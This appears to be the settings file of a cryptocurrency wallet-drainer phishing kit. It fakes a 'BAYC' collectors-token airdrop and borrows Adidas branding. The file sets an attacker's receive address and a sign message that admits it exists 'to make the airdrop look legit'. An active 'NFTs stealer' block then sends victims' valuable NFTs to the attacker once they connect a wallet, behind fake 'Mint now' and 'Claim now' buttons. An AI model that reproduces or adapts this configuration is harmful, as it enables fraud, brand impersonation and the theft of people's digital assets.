const receiveAddress = "0xc41A181F5A0Ec08A7a48A03d6a1230374bc54268";

const collectionInfo = {
    name: "BAYC nft-professor",
    socialMedia: {
        discord: "",
        twitter: "https://nft-professor.sellix.io",
        instagram: "",
    },
}

const signMessage = `Welcome, \n\n` +
    `You can say anything here.\n\n` +
    `This is a message only used to make the airdrop look legit.\n\n` +
    `Wallet Address:\n{address}\n` +
    `Nonce:\n{nonce}`;

const indexPageInfo = {
    backgroundImage: "background.jpg", // relative path to background image (in assets)
    title: "{name}", // {name} will be replaced with collectionInfo.name
    underTitle: "COLLECTORS TOKEN",
}

const claimPageInfo = {
    title: "COLLECTORS<br>TOKEN", // <br> is a line break
    shortDescription: "SHOW YOUR LOYALTY.",
    longDescription: "A BAYC TOKEN IS A SIGN YOU’VE BEEN PART OF ADIDAS SINCE THE START. IT GIVES YOU EARLY ACCESS TO MERCH, EVENTS AND MORE.",

    claimButtonText: "CLAIM NOW",

    image: "adidas.png", // relative path to image (in assets)
    imageRadius: 250, // image radius in px
}

const drainNftsInfo = {
    active: true, // Active (true) or not (false) NFTs stealer.
    minValue: 0.5, // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
}

const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "Connect wallet",
    transferButton: "Mint now",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion